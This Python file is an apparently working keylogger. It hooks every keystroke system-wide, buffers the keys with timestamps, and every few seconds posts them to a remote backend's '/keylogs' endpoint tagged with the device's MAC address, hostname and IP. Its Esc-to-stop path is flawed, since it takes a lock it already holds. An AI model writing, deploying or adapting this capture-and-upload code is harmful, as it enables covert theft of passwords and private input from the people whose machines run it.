import threading
import time
import requests
import socket
from datetime import datetime
import keyboard
from utils import BACKEND_URL, get_ip, get_mac

SEND_INTERVAL = 5
keystroke_buffer = []
buffer_lock = threading.Lock()


def send_batched_keystrokes(backend: str):
    while True:
        time.sleep(SEND_INTERVAL)
        with buffer_lock:
            if keystroke_buffer:
                mac = get_mac()
                payload = {
                    "deviceId": mac,
                    "mac": mac,
                    "hostname": socket.gethostname(),
                    "ip": get_ip(),
                    "keys": keystroke_buffer.copy(),
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                keystroke_buffer.clear()
                # print(f"Sending payload: {payload}")  # Debug payload
                try:
                    response = requests.post(f"{backend}/keylogs", json=payload)
                    response.raise_for_status()
                    # print(f"Sent {len(payload['keys'])} keystrokes to backend")
                except requests.exceptions.RequestException as e:
                    print(f"Failed to send keystrokes: {e}")
                    keystroke_buffer.extend(payload["keys"])


def buffer_keystroke(key_str):
    # Ensure key_str is a valid string
    if not isinstance(key_str, str) or not key_str or key_str == "unknown":
        return
    with buffer_lock:
        keystroke_buffer.append(
            {"key": key_str, "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        )


def handle_key_press(key):
    key_str = key.name if hasattr(key, "name") else str(key)
    print(f"{key_str} was just pressed to buffer")
    buffer_keystroke(key_str)


def handle_key_release(key):
    print("releasing something")
    if key.name == "esc":
        with buffer_lock:
            if keystroke_buffer:
                send_immediate(BACKEND_URL)
        return False


def send_immediate(backend):
    with buffer_lock:
        if keystroke_buffer:
            mac = get_mac()
            payload = {
                "deviceId": mac,
                "mac": mac,
                "hostname": socket.gethostname(),
                "ip": get_ip(),
                "keys": keystroke_buffer.copy(),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
            keystroke_buffer.clear()
            print(f"Sending immediate payload: {payload}")  # Debug payload
            try:
                response = requests.post(f"{backend}/keylogs", json=payload)
                response.raise_for_status()
                print(f"Sent {len(payload['keys'])} keystrokes to backend (immediate)")
            except requests.exceptions.RequestException as e:
                print(f"Failed to send immediate keystrokes: {e}")


def main():
    print(
        f"Starting keystroke recorder... Sending batches every {SEND_INTERVAL} seconds. Press Esc to stop."
    )
    sender_thread = threading.Thread(
        target=send_batched_keystrokes, args=(BACKEND_URL,), daemon=True
    )
    sender_thread.start()
    keyboard.hook(handle_key_press)
    keyboard.wait(None)
    keyboard.unhook_all()


if __name__ == "__main__":
    main()
